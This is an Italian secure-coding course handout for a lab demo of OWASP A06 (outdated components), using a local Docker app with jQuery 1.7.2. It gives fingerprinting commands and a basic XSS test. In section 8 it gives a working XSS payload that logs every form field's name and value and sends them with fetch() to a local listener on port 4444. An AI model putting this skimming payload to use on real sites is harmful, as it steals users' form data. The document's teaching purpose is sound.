# A06_Demo.md
## OWASP A06:2021 – Vulnerable & Outdated Components  
### Demo Didattica Completa (Step-by-Step)

Questo file guida gli studenti nella dimostrazione pratica di come i **componenti obsoleti** possano portare a **vulnerabilità reali**: XSS, data exfiltration e exploit basati su CVE noti.

---

# 1. Obiettivo della Demo

Dimostrare che:
- usare componenti vecchi (PHP 7.4, MySQL 5.7, jQuery 1.7.2, Bootstrap 3.x)
- espone automaticamente l’app a CVE note e sfruttabili
- permette attacchi reali, come XSS → furto dati → compromissione sessioni

---

# 2. Avvio dell’Ambiente

```bash
docker-compose up -d
```

Applicazione:  
```
http://localhost:8006
```

---

# 3. Fingerprinting dei Componenti (Studenti)

### 3.1 Verificare versioni con DevTools
Apri DevTools → Network / Sources.

Controllare:
- jQuery 1.7.2
- Bootstrap 3.4.1
- PHP 7.4 (header X-Powered-By)
- MySQL 5.7 (visibile su info.php)

### 3.2 WhatWeb (docente)

```bash
whatweb http://localhost:8006
```

### 3.3 Nmap (docente)

```bash
nmap -sV -p 8006 --script http-server-header,http-php-info localhost
```

---

# 4. Ricerca CVE (Studenti)

Esempi:
- jQuery 1.7.2 → CVE-2011-4969
- PHP 7.4 → vari CVE
- MySQL 5.7 → non supportato
- Bootstrap 3.x → vulnerabilità note

---

# 5. Identificazione della Vulnerabilità jQuery (Studenti)

Aprire:
```
http://localhost:8006/post.php?id=1
```

Identificare area gialla processata con `.html()`.

---

# 6. Primo Test XSS (Studenti)

```html
<img src=x onerror="alert('XSS con jQuery 1.7.2!')">
```

---

# 7. Preparazione Attacco Avanzato (Docente)

```bash
python3 -m http.server 4444
```

---

# 8. Payload XSS Avanzato — Form Logging (Studenti)

```html
<img src=x onerror="
document.querySelectorAll('input, textarea').forEach(function(el){
  el.addEventListener('change', function(){
    fetch('http://127.0.0.1:4444/?field='
      + encodeURIComponent(el.name || el.id || 'no_name')
      + '&value='
      + encodeURIComponent(el.value)
    );
  });
});
">
```

---

# 9. Esecuzione Attacco

Compila i form → invia → nel terminale del docente appaiono richieste come:

```
/?field=name&value=Marco
```

---

# 10. Mitigazioni

- aggiornare jQuery → 3.7.1
- evitare `.html()` con input utente
- usare `.text()`
- aggiungere CSP
- non esporre versioni dei componenti

---

# 11. Checklist Studenti

- [ ] Identificare componenti obsoleti  
- [ ] Cercare CVE  
- [ ] Eseguire XSS base  
- [ ] Eseguire XSS avanzato  
- [ ] Osservare exfiltrazione  
- [ ] Annotare mitigazioni  

---

Corso Secure Coding - 2025
